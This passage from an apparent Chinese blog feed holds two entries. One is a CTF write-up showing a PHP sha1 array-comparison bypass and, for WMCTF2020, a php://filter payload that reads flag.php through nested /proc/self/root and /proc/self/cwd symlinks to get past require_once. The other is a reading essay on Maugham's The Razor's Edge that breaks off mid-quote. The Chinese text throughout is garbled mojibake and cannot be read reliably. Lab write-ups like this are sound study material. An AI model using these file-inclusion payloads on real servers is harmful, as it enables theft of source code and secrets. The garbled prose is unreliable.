class="hljs-string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>] !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// collect information from phpinfo!</span><br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>ç®€å•<code>hash</code>å¼ºç­‰äºç»•è¿‡ï¼š</p><p><code>roam1[]=1&amp;roam2[]=2</code></p><p><img src="/img/roamwhat1.png" alt="roamwhat1"></p><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™ä¸ª<code>require_once</code>ï¼Œé¡ºä¾¿å¤ä¹ ä¸‹å‡ ä¸ªå¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š</p><blockquote><p>include()å‡½æ•°å½“é‡åˆ°é”™è¯¯çš„ä¿¡æ¯æ—¶ï¼Œä¼šè¿›è¡ŒæŠ¥é”™ï¼Œä½†ä»ç„¶ä¼šç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç <br>include_once()å‡½æ•°ä¸include()å‡½æ•°åŠŸèƒ½ç±»ä¼¼ï¼Œä½†æ‰€åŒ…å«çš„ä¿¡æ¯åªæ‰§è¡Œä¸€æ¬¡<br>require()å‡½æ•°å½“é‡åˆ°é”™è¯¯çš„ä¿¡æ¯æ—¶ï¼Œä¼šè¿›è¡ŒæŠ¥é”™ï¼Œå¹¶ä¸”ä¸ä¼šå†ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç <br>require_once()å‡½æ•°ä¸require()å‡½æ•°åŠŸèƒ½ç±»ä¼¼ï¼Œä½†æ‰€åŒ…å«çš„ä¿¡æ¯åªæ‰§è¡Œä¸€æ¬¡</p></blockquote><p>ç»•è¿‡å‚è€ƒ<code>https://www.anquanke.com/post/id/213235</code></p><p>å¤§è‡´å°±æ˜¯å½“è½¯é“¾æ¥å¤šåˆ°ä¸€å®šç¨‹åº¦ï¼ˆè·¯å¾„åµŒå¥—å¤Ÿå¤šï¼‰åå¯ä»¥å®ç°ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>proc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>xxxx<br><br></code></pre></td></tr></table></figure><p>è¿™ç§è·¯å¾„</p><p><code>/proc/self/root</code>è¿™ä¸œè¥¿å…¶å®å°±æ˜¯<code>/</code>ï¼Œå¤šå±‚åµŒå¥—ä¹‹åè¿˜æ˜¯<code>/</code>:</p><p><img src="/img/procroot.png" alt="procroot"></p><p>æ‰€ä»¥å¯¹äºè¿™ç§è·¯å¾„ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>proc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>rootproc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>xxxx<br><br></code></pre></td></tr></table></figure><p>å…¶å®è¿˜æ˜¯<code>/var/www/html/xxxx</code></p><p>å°è¯•è¯»å–ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p><code>php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><p>å°±è¡Œã€‚</p><p>åé¢çœ‹æœ‰çš„å¸ˆå‚…ç”¨è¿™ç§æ–¹æ³•ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/nice/</span>..<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag.php<br><br></code></pre></td></tr></table></figure><p><code>/proc/self/cwd/</code>è¿™ä¸œè¥¿ç›´æ¥æŒ‡å‘äº†å½“å‰çš„å·¥ä½œç›®å½•ï¼Œå°±ç”¨ä¸ç€çŒœ<code>/var/www/html/</code>äº†ã€‚å¦å¤–<code>nice</code>è¿™ä¸ªä¸œè¥¿æ¢æˆå•¥éƒ½è¡Œï¼Œåªè¦æ¥ä¸‹æ¥é€šè¿‡<code>..</code>å†è·³å›åˆ°æ ¹ç›®å½•å°±è¡Œã€‚ä½†æ³¨æ„<code>proc/self/cwd</code>è¿™ä¸œè¥¿ä¸èƒ½æ”¹æˆ<code>var/www/html</code>ã€‚å› ä¸º<code>payload</code>ä¸­ä¸€å®šè¦å­˜åœ¨ç¬¦å·é“¾æ¥ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">è¿™ç§ä¹Ÿè¡Œï¼š<br><span class="hljs-regexp">/nice/</span>..<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>var<span class="hljs-regexp">/www/</span>html/flag.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡è¯»æ¯›å§†&lt;åˆ€é”‹&gt;ï¼Œå’Œä¸€ç‚¹æ„Ÿæƒ³</title>
    <link href="/2023/12/25/2023-12-20-%E9%87%8D%E8%AF%BB%E6%AF%9B%E5%A7%86%E3%80%8A%E5%88%80%E9%94%8B%E3%80%8B%EF%BC%8C%E5%92%8C%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/"/>
    <url>/2023/12/25/2023-12-20-%E9%87%8D%E8%AF%BB%E6%AF%9B%E5%A7%86%E3%80%8A%E5%88%80%E9%94%8B%E3%80%8B%EF%BC%8C%E5%92%8C%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<p>æŠ½ç©ºæŠŠ&lt;åˆ€é”‹&gt;åˆè¯»äº†ä¸€éï¼Œéšä¾¿å†™ç‚¹æ„Ÿæƒ³ã€‚</p><span id="more"></span><hr><blockquote><p> åˆ©åˆƒé”‹ç¼˜å°¤éš¾æ”€è¶Šï¼›æ™ºè€…è¾„è°“å¾—æ•‘ä¹‹è·¯ä¹ƒè‰°é€”ä¹Ÿã€‚â€”â€”ã€Šç¾¯é™€å¥¥ä¹‰ä¹¦ã€‹</p><p> å©é—®ç”Ÿå‘½çš„ç»ˆææ„ä¹‰æ˜¯å›°éš¾çš„ï¼ŒçŠ¹å¦‚è¡Œåœ¨åˆ€é”‹ã€‚</p></blockquote><p>â€‹<strong>ç£¨è¹­äº†ä¸€ä¸ªå¤šæœˆè¿˜æ²¡å†™å®Œï¼Œè¿™ä¸ªå‘ä»¥åæ…¢æ…¢å¡«å§ï¼Œå”‰:(</strong></p><p><img src="/img/therages.jpg" alt="therages"></p><p>â€‹    è¯»å®Œåç®—äº†ç®—ï¼Œè¿™æœ¬ä¹¦æˆ‘è‡³å°‘è¯»è¿‡å››éäº†ã€‚æ¯›å§†ä¼šè®²æ•…äº‹ï¼Œè¯»è¿‡ä»–çš„ã€Šæœˆäº®å’Œå…­ä¾¿å£«ã€‹ï¼Œã€Šåˆ€é”‹ã€‹ï¼Œã€Šå¯»æ¬¢ä½œä¹ã€‹ï¼Œã€Šé¢çº±ã€‹ï¼Œã€Šäººæ€§çš„æ·é”ã€‹ï¼Œã€Šåœ£è¯å‡æ—¥ã€‹(è¿™ä¸ªæ„Ÿè§‰çŸ¥ååº¦æŒºä½çš„ï¼Œåœ¨å›¾ä¹¦é¦†æºœè¾¾è¢«æˆ‘ç¢°åˆ°äº†)ã€‚ä»ã€Šåˆ€é”‹ã€‹ä¸­çš„æ‹‰é‡Œï¼Œåˆ°ã€Šæœˆäº®ä¸å…­ä¾¿å£«ã€‹ä¸­çš„æ–¯ç‰¹é‡Œå…‹å…°å¾·å†åˆ°ã€Šäººæ€§çš„æ·é”ã€‹ä¸­çš„å‡¯é‡Œï¼Œæˆ‘è§‰å¾—è¿™äº›ä½œå“éƒ½åœ¨è®¨è®ºä¸€ä¸ªé—®é¢˜ï¼š<strong>ä¸€ç”Ÿè¦å¦‚ä½•åº¦è¿‡ï¼Ÿ</strong></p><p>â€‹&lt;åˆ€é”‹&gt;å†…å®¹å…¶å®æŒºå¥½æ¦‚æ‹¬çš„ï¼šæ‹‰é‡Œä¸ºäº†åšè‡ªå·±æƒ³åšçš„äº‹æ”¾å¼ƒäº†å¾ˆå¤šã€‚</p><blockquote><p>â€‹â€œè®¤ä¸ºå°åº¦äººæŠŠä¸–ç•Œçœ‹ä½œæ˜¯å¹»è§‰ï¼Œè¿™æ˜¯é”™çš„ï¼›å°åº¦äººå¹¶ä¸å¦‚æ­¤ï¼›ä»–ä»¬åªè¯´ä¸–ç•Œçš„çœŸå®å’Œç»å¯¹çš„çœŸå®ä¸èƒ½åŒæ—¥è€Œè¯­ã€‚ç›é›…åªæ˜¯é‚£äº›çƒ­è¡·çš„æ€æƒ³å®¶ç¼–å‡ºæ¥çš„ï¼Œå€Ÿæ­¤è§£é‡Šæ— ç©·æ€æ ·åˆ›é€ æœ‰ç©·ã€‚æ²™å§†å¡æ‹‰ï¼Œä»–ä»¬é‡Œé¢æœ€èªæ˜çš„ä¸€ä¸ªï¼Œæ–­è¨€è¿™æ˜¯ä¸€ä¸ªè§£å†³ä¸äº†çš„è°œå›¢ã€‚ä½ çŸ¥é“ï¼Œå›°éš¾åœ¨äºè§£é‡Šä¸ºä»€ä¹ˆå©†ç½—é—¨è¦åˆ›é€ ä¸–ç•Œã€‚å©†ç½—é—¨æ˜¯å­˜åœ¨ã€ç¦æ³½å’Œæ™ºæ…§ï¼›å®ƒæ˜¯ä¸å¯æ”¹å˜çš„ï¼›å®ƒä¸€ç›´åœ¨è¿™é‡Œï¼Œè€Œä¸”æ°¸è¿œä¿æŒé™æ­¢ï¼Œå®ƒä»€ä¹ˆéƒ½ä¸ç¼ºï¼Œå®ƒä»€ä¹ˆéƒ½ä¸éœ€è¦ï¼Œå› æ­¤æ—¢ä¸çŸ¥é“å˜æ˜“ï¼Œä¹Ÿä¸çŸ¥é“äº‰å¤ºï¼Œå®ƒæ˜¯åå…¨åç¾çš„ï¼›æ—¢ç„¶å¦‚æ­¤ï¼Œå®ƒä¸ºä»€ä¹ˆè¦åˆ›é€ ä¸–ç•Œå‘¢ï¼Ÿä½ å‡å¦‚é—®è¿™ä¸ªé—®é¢˜ï¼Œä½ å¾—åˆ°çš„ä¸€èˆ¬è§£ç­”æ˜¯ï¼Œç»å¯¹åˆ›é€ ä¸–ç•Œæ˜¯é—¹ç€ç©çš„ï¼Œå¹¶ä¸å¸¦æœ‰ä»€ä¹ˆç›®çš„ã€‚å¯æ˜¯ï¼Œå½“ä½ æƒ³åˆ°æ´ªæ°´å’Œé¥¥è°¨ï¼Œåœ°éœ‡å’Œé£“é£ï¼Œæƒ³åˆ°æŠ˜ç£¨äººä½“çš„ä¸€åˆ‡ç–¾ç—…ï¼Œä½ çš„æ­£ä¹‰æ„Ÿå°±ä¼šçˆ†å‘å‡ºæ¥ï¼Œè®¤ä¸ºè¿™ä¹ˆå¤šéª‡äººå¬é—»çš„ä¸œè¥¿å½“åˆæ€ä¹ˆä¼šè¿™æ ·éšéšä¾¿ä¾¿å°±åˆ›é€ å‡ºæ¥ã€‚è¥¿é‡ŒÂ·ç”˜ä¹ƒå¤å¿ƒåœ°å¤ªå¿ åšäº†ï¼Œæ‰€ä»¥ä¸ç›¸ä¿¡è¿™ç§å­¦è¯´ï¼›ä»–æŠŠä¸–ç•Œçœ‹ä½œæ˜¯ç»å¯¹çš„è¡¨ç°ï¼Œè€Œä¸”æ˜¯å®ƒçš„å®Œå–„çš„æ³›æ»¥ã€‚ä»–æ•™å¯¼è¯´ï¼Œç¥æ²¡æ³•å­ä¸åˆ›é€ ï¼Œè€Œä¸–ç•Œåˆ™æ˜¯ç¥æ€§çš„è¡¨ç°ã€‚æˆ‘é—®ä»–ï¼Œæ—¢ç„¶ä¸–ç•Œæ˜¯ä¸€ä¸ªåå…¨åç¾çš„ä¸»å®°çš„æœ¬æ€§è¡¨ç°ï¼Œä¸ºä»€ä¹ˆå®ƒæ˜¯è¿™æ ·çš„å¯æ¨ï¼Œä½¿ä¼—ç”Ÿçš„å”¯ä¸€åˆç†å‡ºè·¯å°±æ˜¯æ‘†è„±å®ƒçš„æŸç¼šã€‚è¥¿é‡ŒÂ·ç”˜ä¹ƒå¤å›ç­”è¯´ï¼Œå°˜ä¸–çš„æ»¡è¶³éƒ½æ˜¯æš‚æ—¶çš„ï¼Œåªæœ‰æ— é™èƒ½æä¾›æŒä¹…çš„å¿«ä¹å’Œå¹¸ç¦ã€‚ä½†æ˜¯ï¼Œæ—¶é—´çš„æ²¡å®Œæ²¡äº†å¹¶ä¸èƒ½ä½¿å–„æ›´åŠ å–„äº›ï¼Œä¹Ÿä¸èƒ½ä½¿è‡ªæ›´åŠ ç™½äº›ã€‚å¦‚æœä¸­åˆçš„è”·è–‡å¤±å»å®ƒåœ¨æ¸…æ™¨æ—¶çš„å¨‡ç¾ï¼Œå®ƒåœ¨æ¸…æ™¨æ—¶çš„å¨‡ç¾ä»ç„¶æ˜¯çœŸå®çš„ã€‚ä¸–é—´ä¸‡äº‹ä¸‡ç‰©éƒ½æœ‰ä¸ªå®Œï¼Œæˆ‘ä»¬é™¤éæ˜¯å‚»å­æ‰è¦æ±‚äº‹ç‰©æ°¸ä¹…ä¸å˜ï¼Œä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä¸æŠ“ç€æ‰‹é‡Œçš„ä¸œè¥¿åŠæ—¶äº«å—å®ƒï¼Œè‚¯å®šè¯´æˆ‘ä»¬å°±æ›´å‚»äº†ã€‚å¦‚æœäº¤æ˜“æ˜¯äº‹ç‰©çš„æœ¬æ€§ï¼Œæˆ‘ä»¬ä¼šè®¤ä¸ºæŠŠè¿™ä¸€æ¡ä½œä¸ºäººç”Ÿå“²å­¦çš„å‰æï¼Œæ˜¯æœ€åˆæƒ…åˆç†äº†ã€‚æˆ‘ä»¬è°ä¹Ÿä¸èƒ½ä¸¤æ¬¡æ¿¯è¶³äºåŒä¸€çš„æ²³æµï¼Œç„¶è€Œï¼Œæ²³æ°´æµå»ï¼Œç»§ä¹‹æµæ¥çš„æ°´ä»æ—§ä¸€æ ·æ¸…å‡‰æ²äººã€‚</p></blockquote><blockquote><p>â€‹æˆ‘æ‹¿èµ·æ‹‰é‡Œçš„ä¹¦ï¼Œçœ‹çœ‹ç›®å½•ã€‚æˆ‘çš„ä¸€æœ¬åœ¨æˆ‘ç¦»å¼€é‡Œç»´åŸƒæ‹‰æ—¶è¿˜æ²¡æœ‰å¯„æ¥ï¼Œç°åœ¨åœ¨å‡ å¤©ä¹‹å†…æ²¡æ³•çœ‹åˆ°ã€‚ä¹¦å†™å¾—å®Œå…¨å‡ºä¹æˆ‘çš„æ„æ–™ï¼Œæ˜¯ä¸€æœ¬è®ºæ–‡é›†ï¼Œç¯‡å¹…å’Œåˆ©é¡¿Â·æ–¯ç‰¹é›·å¥‡çš„ã€Šç»´å¤šåˆ©äºšåäººä¼ ã€‹ç›¸ä»¿ä½›ï¼Œè®ºè¿°äº†è‹¥å¹²æœ‰åäººç‰©ã€‚ä»–æŒ‘é€‰çš„äººä½¿æˆ‘è¿·æƒ‘ä¸è§£ã€‚æœ‰ä¸€ç¯‡è®ºè¿°ç½—é©¬ç‹¬è£è€…è‹æ‹‰ï¼Œåœ¨ç‹¬æ½å¤§æƒä¹‹åï¼Œé€€ä½å½’éšï¼Œä¸€ç¯‡è®ºå»ºç«‹å¸å›½çš„è’™å¤å¾æœè€…é˜¿å…‹å·´å°”ï¼›ä¸€ç¯‡è®ºå•æœ¬ï¼Œä¸€ç¯‡è®ºæ­Œå¾·ï¼Œè¿˜æœ‰ä¸€ç¯‡è®ºåˆ‡æ–¯ç‰¹è²å°”å¾·å‹‹çˆµï¼Œé‚£ä¸ªææ–‡å­¦çš„ã€‚æ˜¾ç„¶æ¯ç¯‡æ–‡ç« éƒ½éœ€è¦è¯»è®¸å¤šä¹¦ï¼Œæ— æ€ªæ‹‰é‡Œè¦èŠ±è¿™ä¹ˆé•¿çš„æ—¶é—´æ‰èƒ½å†™æˆï¼Œå¯æ˜¯ï¼Œæˆ‘ä¸æ‡‚å¾—ä¸ºä»€ä¹ˆä»–è®¤ä¸ºå€¼å¾—åœ¨è¿™ä¸Šé¢èŠ±è¿™ä¹ˆå¤šæ—¶é—´ï¼Œä¹Ÿä¸æ‡‚å¾—ä»–ä¸ºä»€ä¹ˆé€‰æ‹©è¿™äº›äººæ¥ç ”ç©¶ã€‚æ¥ç€æˆ‘æƒ³èµ·æ¥ï¼Œä»–ä»¬æ¯ä¸ªäººéƒ½ä»¥å„è‡ªçš„æ–¹å¼å†æ­¤ç”Ÿè·å¾—äº†å“è¶Šä¸å‡¡çš„æˆç»©ã€‚æˆ‘æƒ³è¿™å°±æ˜¯æ‹‰é‡Œæ„Ÿå…´è¶£çš„ç¼˜ç”±ã€‚ä»–å¾ˆå¥½å¥‡ï¼Œæƒ³çŸ¥é“è¿™ä¸€åˆ‡åˆ°æœ€ç»ˆå½’ç»“çš„æ„å‘³ã€‚</p></blockquote><p>â€‹ æœ€å¼€å§‹è¯»å°è¯´éƒ½æ˜¯çœ‹çš„ä¸€äº›ä¾¦æ¢å°è¯´ï¼Œé’±å¾·å‹’&lt;æ¼«é•¿çš„å‘Šåˆ«&gt;ï¼Œ&lt;é•¿çœ ä¸é†’&gt;ï¼Œ&lt;å†è§ï¼Œå¾çˆ±&gt;ã€‚åé¢åˆå¼€å§‹è¯»å¸ƒæ´›å…‹çš„&lt;å…«ç™¾ä¸‡ç§æ­»æ³•&gt;(æ²¡è¯»å®Œ)å’Œ&lt;é…’å§å…³é—¨ä¹‹å&gt;ã€‚æˆ‘ç‰¹åˆ«å–œæ¬¢ä»–ä»¬é‚£ç§<code>ç¡¬æ±‰</code>ç±»å‹çš„ä¸»è§’ï¼Œä»è²åˆ©æ™®é©¬æ´›åˆ°é©¬ä¿®â€¢æ–¯å¡å¾·ã€‚</p><p>â€‹æˆ‘å–œæ¬¢  ï¼Œç”šè‡³åæ¥è§‰å¾—ä»–ä»¬æŠ½çƒŸå–é…’å¸…çš„ä¸è¡Œä»¥è‡³äºèŒç”Ÿäº†â€˜ å—¯ï¼Œæˆ‘ä¹Ÿè¦æ•´ç‚¹å„¿â€™çš„æƒ³æ³•ã€‚åé¢æƒ³äº†æƒ³æˆ‘å…¶å®å¯èƒ½æ˜¯å–œæ¬¢ä»–ä»¬çš„å†™ä½œé£æ ¼ï¼šæ–‡ç¬”ç®€æ´æ˜å¿«ã€‚è¿™ä¹Ÿæ˜¯æˆ‘åé¢å–œæ¬¢è¯»æµ·æ˜å¨çš„åŸå› ã€‚</p><p>â€‹æ„Ÿå—ä¸€ä¸‹&lt;è€äººä¸æµ·&gt;çš„ç»“å°¾ï¼š</p><blockquote><p>â€‹é‚£å¤©ä¸‹åˆï¼Œéœ²å°é¥­åº—æ¥äº†ä¸€ç¾¤æ—…æ¸¸è€…ï¼Œæœ‰ä¸ªå¥³äººæœä¸‹é¢çš„æµ·æ°´æœ›å»ï¼Œçœ‹è§åœ¨ä¸€äº›ç©ºæ°”é…’å¬å’Œæ­»æ¢­å­é±¼ä¹‹é—´ï¼Œæœ‰ä¸€æ¡åˆç²—åˆé•¿çš„ç™½è‰²è„Šéª¨ï¼Œä¸€ç«¯æœ‰æ¡å·¨å¤§çš„å°¾å·´ï¼Œå½“ä¸œé£åœ¨æ¸¯å¤–ä¸æ–­åœ°æ€èµ·å¤§æµªçš„æ—¶å€™ï¼Œè¿™å°¾å·´éšç€æ½®æ°´ç“¶è½ã€æ‘‡æ‘†ã€‚</p><p>â€‹ â€œé‚£æ˜¯ä»€ä¹ˆï¼Ÿâ€å¥¹é—®ä¸€åä¾è€…ï¼ŒæŒ‡ç€é‚£æ¡å¤§é±¼çš„é•¿é•¿çš„è„Šéª¨ï¼Œå®ƒå¦‚ä»Šä»…ä»…æ˜¯åƒåœ¾ï¼Œåªç­‰æ½®æ°´æ¥æŠŠå®ƒå¸¦èµ°äº†ã€‚</p><p>â€‹ â€œï¼´ï½‰ï½‚ï½•ï½’ï½ï½ï¼Œâ€ä¾è€…è¯´ï¼Œâ€œï¼¥ï½“ï½ˆï½ï½’ï½‹ã€‚â€ä»–æ‰“ç®—è§£é‡Šè¿™äº‹æƒ…çš„ç»è¿‡ã€‚</p><p>â€‹â€œæˆ‘ä¸çŸ¥é“é²¨é±¼æœ‰è¿™æ ·æ¼‚äº®çš„å°¾å·´ï¼Œå½¢çŠ¶è¿™æ ·ç¾è§‚ã€‚â€</p><p>â€‹â€œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œâ€å¥¹çš„ç”·ä¼´è¯´ã€‚</p><p>â€‹ åœ¨å¤§è·¯å¦ä¸€å¤´è€äººçš„çªæ£šé‡Œï¼Œä»–åˆç¡ç€äº†ã€‚ä»–ä¾æ—§è„¸æœä¸‹èººç€ï¼Œå­©å­ååœ¨ä»–èº«è¾¹ï¼Œå®ˆç€ä»–ã€‚</p><p>â€‹è€äººæ­£æ¢¦è§ç‹®å­ã€‚</p></blockquote><p>â€‹</p><p>â€‹ä»¥å‰è§‰å¾—â€è¯»ä¹¦æœ‰ä»€ä¹ˆç”¨ï¼Ÿè¯»å®Œå°±å¿˜äº†ï¼Œæˆ‘ä¹Ÿå†™ä¸å‡ºä»€ä¹ˆå¤šæ¼‚äº®çš„ä¸œè¥¿â€ã€‚ç°åœ¨æˆ‘è§‰å¾—è¯»ä¹¦å¹¶ä¸æ˜¯è¦èƒŒä½å†…å®¹ï¼Œä¹Ÿä¸ä¸€å®šéè¦å†™å‡ºç‚¹ä¸œè¥¿ã€‚<br>â€‹ç½—ç¿”æœ‰å¥è¯æˆ‘æ„Ÿè§‰æŒºå¥½çš„ï¼Œå¤§è‡´æ„æ€å°±æ˜¯è¯»ä¹¦å°±åƒåƒé¥­ã€‚ä½ åƒä¸‹å»çš„ä¸œè¥¿å…·ä½“è½¬åŒ–æˆä»€ä¹ˆäº†æ²¡äººè¯´çš„æ˜ç™½ï¼Œä½†ç¡®ç¡®å®å®æˆä¸ºä½ èº«ä½“çš„ä¸€éƒ¨åˆ†äº†ã€‚</p><blockquote><p>ä¸–ç•Œä¸Šä»»ä½•ä¹¦ç±éƒ½ä¸èƒ½å¸¦ç»™ä½ å¥½è¿ï¼Œä½†å®ƒä»¬èƒ½è®©ä½ æ‚„æ‚„æˆä¸ºä½ è‡ªå·±ã€‚â€”èµ«å°”æ›¼ Â· é»‘å¡</p></blockquote><p>â€‹æˆ‘è§‰å¾—æ–‡å­¦çš„æœ¬è´¨è®©äººä½“ä¼šåˆ°å‘ç”Ÿåœ¨ä»–äººå‘¨å›´çš„äº‹ï¼Œä¼šæœ‰è‡ªå·±çš„æ€è€ƒå’Œæ„Ÿæ‚Ÿã€‚æ–‡å­—ä¹Ÿä¸ä¸€å®šè¦å¤šä¼˜ç¾ï¼Œæ‹¿ã€Šæˆ˜äº‰ä¸å’Œå¹³ã€‹æ¥è¯´ï¼Œå…¨ç¯‡å¹¶æ²¡æœ‰ä»€ä¹ˆåä¸½åœ°æå†™ï¼Œå¹³æ·¡åœ°æè¿°äº†1805-20å¹´é—´ä¿„å›½è´µæ—ç”Ÿæ´»&#x2F;æˆ˜åœºï¼Œé‡Œé¢çš„äººç‰©å½¢å½¢è‰²è‰²ï¼Œå†å²å°±åƒè½¦è½®å†·é…·æ— æƒ…çš„ç¢¾è¿‡è·¯è¾¹çš„å°è‰ï¼Œå°±è¿æ‹¿ç ´ä»‘è¿™ç§è‹±é›„äººç‰©åœ¨ä¹¦ä¸­éƒ½ä¸è¿‡æ˜¯ä¸€ä¸ªå‡¡å¤«ä¿—å­èˆ¬çš„å°†å†›ï¼Œä½†å›¾ç”³è¿™ä¸ªå°å°çš„ç‚®å…µä¸‹å£«å´åˆé—ªè€€ç€äººæ€§çš„å…‰è¾‰ã€‚</p><p>â€‹     </p><p>â€‹è€ƒæ–¯è’‚ä¹Ÿæ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„è§’è‰²ï¼šä¸€ä¸ªæ³¢å…°è´µæ—å†›å®˜ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› è·‘åˆ°ç…¤çŸ¿é‡Œé æŒ–ç…¤èµšé’±ï¼Œä»å¤–è¡¨åˆ°è¨€è¡Œéƒ½æ˜¯å½»å¤´å½»å°¾çš„ç²—äººï¼Œå´æœ‰è¿™ä¹ˆä¸€æ®µæå†™ï¼š</p><blockquote><p> â€œä½†æˆ‘çŸ¥é“ä»–åœ¨è¯´è°ï¼Œä»–ç»å¯¹çŸ¥é“è‡ªå·±å½“æ—¶åœ¨è¯´ä»€ä¹ˆã€‚ä»–æ‡‚å¾—å¾ˆå¤šã€‚å½“æ—¶ä»–ç¡®å®å–é†‰äº†ï¼Œç„¶è€Œä»–çš„çœ¼ç¥ï¼Œé‚£å¼ ä¸‘é™‹è„¸åºä¸Šå¿ƒé†‰ç¥è¿·çš„è¡¨æƒ…ï¼Œå´ä¸ä»…å‡ºäºé…’ç²¾çš„ä½œç”¨ï¼Œåº”è¯¥è¿˜æœ‰å’Œå…¶ä»–æ›´å¤šåŸå› ã€‚ä»–ç¬¬ä¸€æ¬¡è¿™æ ·å¼€å£è®²è¯æ—¶ï¼Œé‚£äº›å†…å®¹è®©æˆ‘è‡³ä»Šæ— æ³•å¿˜æ€€ï¼Œå› ä¸ºæˆ‘å¬åˆ°ä»¥åç®€ç›´è¢«å“åäº†ã€‚ä»–è¯´è¿™ä¸ªä¸–ç•Œå¹¶ä¸æ˜¯åˆ›é€ ç”Ÿæˆä¹‹ç‰©ï¼Œå› ä¸ºâ€™ç©ºæ— 